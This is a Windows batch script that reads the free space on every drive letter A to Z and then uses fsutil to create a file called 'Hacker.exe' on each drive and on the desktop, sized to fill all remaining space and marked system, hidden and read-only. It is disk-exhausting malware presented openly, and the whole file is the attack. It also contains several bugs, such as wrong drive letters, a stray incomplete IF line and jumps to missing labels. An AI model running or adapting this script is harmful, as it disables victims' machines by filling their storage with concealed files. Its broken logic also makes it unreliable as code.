@echo off
setlocal
set drive5=A
set drive6=B
set drive=C
set drive1=D
set drive2=E
set drive3=F
set drive4=G

set drive7=H
set drive8=I
set drive9=J
set drive10=K
set drive11=L
set drive12=M
set drive13=N
set drive14=O
set drive15=P
set drive16=Q
set drive17=R
set drive18=S
set drive19=T
set drive20=U
set drive21=V
set drive22=W
set drive23=X
set drive24=Y
set drive25=Z
set free=?
set free1=?
set free2=?
set free3=?
set free4=?
set free5=?
set free6=?
set free7=?
set free8=?
set free9=?
set free10=?
set free11=?
set free12=?
set free13=?
set free14=?
set free15=?
set free16=?
set free17=?
set free18=?
set free19=?
set free20=?
set free21=?
set free22=?
set free23=?
set free24=?
set free25=?
set free26=?
echo %userprofile%
echo ----------------------------
rem Note: WMIC will output unicode text
wmic logicaldisk where (caption = "%drive%:") get freespace>"%temp%\free.tmp"
wmic logicaldisk where (caption ="%drive1%:")get freespace>"%temp%\free1.tmp"
wmic logicaldisk where (caption ="%drive2%:")get freespace>"%temp%\free2.tmp"
wmic logicaldisk where (caption ="%drive3%:")get freespace>"%temp%\free3.tmp"
wmic logicaldisk where (caption ="%drive4%:")get freespace>"%temp%\free4.tmp"
wmic logicaldisk where (caption ="%drive5%:")get freespace>"%temp%\free5.tmp"
wmic logicaldisk where (caption ="%drive6%:")get freespace>"%temp%\free6.tmp"
wmic logicaldisk where (caption ="%drive7%:")get freespace>"%temp%\free7.tmp"
wmic logicaldisk where (caption ="%drive8%:")get freespace>"%temp%\free8.tmp"
wmic logicaldisk where (caption ="%drive9%:")get freespace>"%temp%\free9.tmp"
wmic logicaldisk where (caption ="%drive10%:")get freespace>"%temp%\free10.tmp"
wmic logicaldisk where (caption ="%drive11%:")get freespace>"%temp%\free11.tmp"
wmic logicaldisk where (caption ="%drive12%:")get freespace>"%temp%\free12.tmp"
wmic logicaldisk where (caption ="%drive13%:")get freespace>"%temp%\free13.tmp"
wmic logicaldisk where (caption ="%drive14%:")get freespace>"%temp%\free14.tmp"
wmic logicaldisk where (caption ="%drive15%:")get freespace>"%temp%\free15.tmp"
wmic logicaldisk where (caption ="%drive16%:")get freespace>"%temp%\free16.tmp"
wmic logicaldisk where (caption ="%drive17%:")get freespace>"%temp%\free17.tmp"
wmic logicaldisk where (caption ="%drive18%:")get freespace>"%temp%\free18.tmp"
wmic logicaldisk where (caption ="%drive19%:")get freespace>"%temp%\free19.tmp"
wmic logicaldisk where (caption ="%drive20%:")get freespace>"%temp%\free20.tmp"
wmic logicaldisk where (caption ="%drive21%:")get freespace>"%temp%\free21.tmp"
wmic logicaldisk where (caption ="%drive22%:")get freespace>"%temp%\free22.tmp"
wmic logicaldisk where (caption ="%drive23%:")get freespace>"%temp%\free23.tmp"
wmic logicaldisk where (caption ="%drive24%:")get freespace>"%temp%\free24.tmp"
wmic logicaldisk where (caption ="%drive25%:")get freespace>"%temp%\free25.tmp"
wmic logicaldisk where (caption ="%drive26%:")get freespace>"%temp%\free26.tmp"
for /f %%A in ('type "%temp%\free.tmp"') do (set free=%%A)
for /f %%A in ('type "%temp%\free1.tmp"') do (set free1=%%A)
for /f %%A in ('type "%temp%\free2.tmp"') do (set free2=%%A)
for /f %%A in ('type "%temp%\free3.tmp"') do (set free3=%%A)
for /f %%A in ('type "%temp%\free4.tmp"') do (set free4=%%A)
for /f %%A in ('type "%temp%\free5.tmp"') do (set free5=%%A)
for /f %%A in ('type "%temp%\free6.tmp"') do (set free6=%%A)
for /f %%A in ('type "%temp%\free7.tmp"') do (set free7=%%A)
for /f %%A in ('type "%temp%\free8.tmp"') do (set free8=%%A)
for /f %%A in ('type "%temp%\free9.tmp"') do (set free9=%%A)
for /f %%A in ('type "%temp%\free10.tmp"') do (set free10=%%A)
for /f %%A in ('type "%temp%\free11.tmp"') do (set free11=%%A)
for /f %%A in ('type "%temp%\free12.tmp"') do (set free12=%%A)
for /f %%A in ('type "%temp%\free13.tmp"') do (set free13=%%A)
for /f %%A in ('type "%temp%\free14.tmp"') do (set free14=%%A)
for /f %%A in ('type "%temp%\free15.tmp"') do (set free15=%%A)
for /f %%A in ('type "%temp%\free16.tmp"') do (set free16=%%A)
for /f %%A in ('type "%temp%\free17.tmp"') do (set free17=%%A)
for /f %%A in ('type "%temp%\free18.tmp"') do (set free18=%%A)
for /f %%A in ('type "%temp%\free19.tmp"') do (set free19=%%A)
for /f %%A in ('type "%temp%\free20.tmp"') do (set free20=%%A)
for /f %%A in ('type "%temp%\free21.tmp"') do (set free21=%%A)
for /f %%A in ('type "%temp%\free22.tmp"') do (set free22=%%A)
for /f %%A in ('type "%temp%\free23.tmp"') do (set free23=%%A)
for /f %%A in ('type "%temp%\free24.tmp"') do (set free24=%%A)
for /f %%A in ('type "%temp%\free25.tmp"') do (set free25=%%A)
for /f %%A in ('type "%temp%\free26.tmp"') do (set free26=%%A)
echo Free space: %free% bytes
echo Free Space: %free1% bytes
echo Free Space: %free2% bytes
echo Free Space: %free3% bytes
echo Free Space: %free4% bytes
echo Free Space: %free5% bytes
echo Free Space: %free6% bytes
echo Free Space: %free7% bytes
echo Free Space: %free8% bytes
echo Free Space: %free9% bytes
echo Free Space: %free10% bytes
echo Free Space: %free11% bytes
echo Free Space: %free12% bytes
echo Free Space: %free13% bytes
echo Free Space: %free14% bytes
echo Free Space: %free15% bytes
echo Free Space: %free16% bytes
echo Free Space: %free17% bytes
echo Free Space: %free18% bytes
echo Free Space: %free19% bytes
echo Free Space: %free20% bytes
echo Free Space: %free21% bytes
echo Free Space: %free22% bytes
echo Free Space: %free23% bytes
echo Free Space: %free24% bytes
echo Free Space: %free25% bytes
echo Free Space: %free26% bytes

IF  /I "%free5%" GEQ "0" Goto A_create
IF /I  "%free5%" EQ "0" GOTO A_cannot
IF /I %% 
:A_create
fsutil file createnew Hacker.exe %free5%
if exist "%temp%\free.tmp" del "%temp%\free5.tmp"
attrib +s +h +r A:\Hacker.exe
if /I "%free6%" GEQ "0" goto B_create
if /I "%free6%" EQ "0" goto B_cannot

:B_create
fsutil file createnew Hacker.exe %free6%
if exist "%temp%\free6.tmp" del "%temp%\free6.tmp"
attrib +s +h +r B:\Hacker.exe
if /I "%free1%" GEQ "0" goto C_create
if /I "%free1%" EQ "0" goto C_cannot


:C_create
cd %userprofile%/desktop
fsutil file createnew Hacker.exe %free%
if exist "%temp%\free.tmp" del "%temp%\free.tmp"
attrib +s +h +r %userprofile%/desktop/Hacker.exe
if /I "%free1%" GEQ "0" goto D_create
if /I "%free1%" EQ "0" goto D_cannot

:D_create
fsutil file createnew D:\Hacker.exe %free1%
if exist "%temp%\free1.tmp" del "%temp%\free1.tmp"
attrib +s +h +r D:\Hacker.exe
if /I "%free2%" GEQ "0" goto E_create
if /I "%free2%" EQ "0" goto E_cannot

:E_create
fsutil file createnew E:\Hacker.exe %free2%
if exist "%temp%\free2.tmp" del "%temp%\free2.tmp"
attrib +s +h +r E:\Hacker.exe
if /I "%free3%" GEQ "0" goto F_create
if /I "%free3%" EQ "0" goto F_cannot
if /I "%free3%" EQ "" goto F_empty

:F_create
fsutil file createnew F:\Hacker.exe %free3%
if exist "%temp%\free3.tmp" del "%temp%\free3.tmp"
attrib +s +h +r F:\Hacker.exe
if /I "%free4%" GEQ "0" goto G_create
if /I "%free4%" EQ "0" goto G_cannot

:G_create
fsutil file createnew G:\Hacker.exe %free4%
if exist "%temp%\free4.tmp" del "%temp%\free4.tmp"
attrib +s +h +r G:\Hacker.exe
if /I "%free7%" GEQ "0" goto H_create
if /I "%free7%" EQ "0" goto H_cannot

:H_create
fsutil file createnew H:\Hacker.exe %free7%
if exist "%temp%\free7.tmp" del "%temp%\free7.tmp"
attrib +s +h +r H:\Hacker.exe
if /I "%free8%" GEQ "0" goto I_create
if /I "%free8%" EQ "0" goto I_cannot

:I_create
fsutil file createnew I:\Hacker.exe %free8%
if exist "%temp%\free8.tmp" del "%temp%\free8.tmp"
attrib +s +h +r I:\Hacker.exe
if /I "%free9%" GEQ "0" goto J_create
if /I "%free9%" EQ "0" goto J_cannot

:J_create
fsutil file createnew J:\Hacker.exe %free9%
if exist "%temp%\free9.tmp" del "%temp%\free9.tmp"
attrib +s +h +r J:\Hacker.exe
if /I "%free10%" GEQ "0" goto K_create
if /I "%free10%" EQ "0" goto K_cannot

:K_create
fsutil file createnew K:\Hacker.exe %free10%
if exist "%temp%\free10.tmp" del "%temp%\free10.tmp"
attrib +s +h +r K:\Hacker.exe
if /I "%free11%" GEQ "0" goto I_create
if /I "%free11%" EQ "0" goto I_cannot

:L_create
fsutil file createnew L:\Hacker.exe %free11%
if exist "%temp%\free11.tmp" del "%temp%\free11.tmp"
attrib +s +h +r L:\Hacker.exe
if /I "%free12%" GEQ "0" goto M_create
if /I "%free12%" EQ "0" goto M_cannot

:M_create
fsutil file createnew M:\Hacker.exe %free12%
if exist "%temp%\free12.tmp" del "%temp%\free12.tmp"
attrib +s +h +r M:\Hacker.exe
if /I "%free13%" GEQ "0" goto N_create
if /I "%free13%" EQ "0" goto N_cannot


:N_create
fsutil file createnew N:\Hacker.exe %free13%
if exist "%temp%\free13.tmp" del "%temp%\free13.tmp"
attrib +s +h +r N:\Hacker.exe
if /I "%free14%" GEQ "0" goto O_create
if /I "%free14%" EQ "0" goto O_cannot


:O_create
fsutil file createnew O:\Hacker.exe %free14%
if exist "%temp%\free14.tmp" del "%temp%\free14.tmp"
attrib +s +h +r O:\Hacker.exe
if /I "%free15%" GEQ "0" goto P_create
if /I "%free15%" EQ "0" goto P_cannot


:P_create
fsutil file createnew P:\Hacker.exe %free15%
if exist "%temp%\free15.tmp" del "%temp%\free15.tmp"
attrib +s +h +r P:\Hacker.exe
if /I "%free16%" GEQ "0" goto Q_create
if /I "%free16%" EQ "0" goto Q_cannot


:Q_create
fsutil file createnew Q:\Hacker.exe %free16%
if exist "%temp%\free16.tmp" del "%temp%\free16.tmp"
attrib +s +h +r Q:\Hacker.exe
if /I "%free17%" GEQ "0" goto R_create
if /I "%free17%" EQ "0" goto R_cannot

:R_create
fsutil file createnew R:\Hacker.exe %free17%
if exist "%temp%\free17.tmp" del "%temp%\free17.tmp"
attrib +s +h +r R:\Hacker.exe
if /I "%free18%" GEQ "0" goto S_create
if /I "%free18%" EQ "0" goto S_cannot

:S_create
fsutil file createnew G:\Hacker.exe %free18%
if exist "%temp%\free18.tmp" del "%temp%\free18.tmp"
attrib +s +h +r S:\Hacker.exe
if /I "%free19%" GEQ "0" goto T_create
if /I "%free19%" EQ "0" goto T_cannot

:T_create
fsutil file createnew T:\Hacker.exe %free19%
if exist "%temp%\free19.tmp" del "%temp%\free19.tmp"
attrib +s +h +r T:\Hacker.exe
if /I "%free20%" GEQ "0" goto U_create
if /I "%free20%" EQ "0" goto U_cannot

:U_create
fsutil file createnew U:\Hacker.exe %free20%
if exist "%temp%\free20.tmp" del "%temp%\free20.tmp"
attrib +s +h +r U:\Hacker.exe
if /I "%free21%" GEQ "0" goto V_create
if /I "%free21%" EQ "0" goto V_cannot

:V_create
fsutil file createnew V:\Hacker.exe %free21%
if exist "%temp%\free21.tmp" del "%temp%\free21.tmp"
attrib +s +h +r V:\Hacker.exe
if /I "%free22%" GEQ "0" goto W_create
if /I "%free22%" EQ "0" goto W_cannot

:W_create
fsutil file createnew W:\Hacker.exe %free22%
if exist "%temp%\free22.tmp" del "%temp%\free22.tmp"
attrib +s +h +r W:\Hacker.exe
if /I "%free23%" GEQ "0" goto X_create
if /I "%free23%" EQ "0" goto X_cannot

:X_create
fsutil file createnew X:\Hacker.exe %free23%
if exist "%temp%\free23.tmp" del "%temp%\free23.tmp"
attrib +s +h +r H:\Hacker.exe
if /I "%free24%" GEQ "0" goto Y_create
if /I "%free24%" EQ "0" goto Y_cannot

:Y_create
fsutil file createnew Y:\Hacker.exe %free24%
if exist "%temp%\free24.tmp" del "%temp%\free24.tmp"
attrib +s +h +r Y:\Hacker.exe
if /I "%free25%" GEQ "0" goto Z_create
if /I "%free25%" EQ "0" goto Z_cannot

:Z_create
fsutil file createnew Z:\Hacker.exe %free25%
if exist "%temp%\free25.tmp" del "%temp%\free25.tmp"
attrib +s +h +r Z:\Hacker.exe


pause
exit
:A_cannot
echo The Drive is Full or Not Available!
:B_cannot
echo The Drive is Full or Not Available!
:C_cannot
echo The Drive is Full or Not Available!
:D_cannot
echo The Drive is Full or Not Available!
:E_cannot
echo The Drive is Full or Not Available!
:F_cannot
echo The Drive is Full or Not Available!
:G_empty
echo The Drive is Full or Not Available!
:H_cannot
echo The Drive is Full or Not Available!
:I_cannot
echo The Drive is Full or Not Available!
:J_cannot
echo The Drive is Full or Not Available!
:K_cannot
echo The Drive is Full or Not Available!
:L_cannot
echo The Drive is Full or Not Available!
:M_cannot
echo The Drive is Full or Not Available!
:N_cannot
echo The Drive is Full or Not Available!
:O_cannot
echo The Drive is Full or Not Available!
:P_cannot
echo The Drive is Full or Not Available!
:Q_cannot
echo The Drive is Full or Not Available!
:R_cannot
echo The Drive is Full or Not Available!
:S_cannot
echo The Drive is Full or Not Available!
:T_cannot
echo The Drive is Full or Not Available!
:U_cannot
echo The Drive is Full or Not Available!
:V_cannot
echo The Drive is Full or Not Available!
:W_cannot
echo The Drive is Full or Not Available!
:X_cannot
echo The Drive is Full or Not Available!
:Y_cannot
echo The Drive is Full or Not Available!
:Z_cannot
echo The Drive is Full or Not Available!
pause
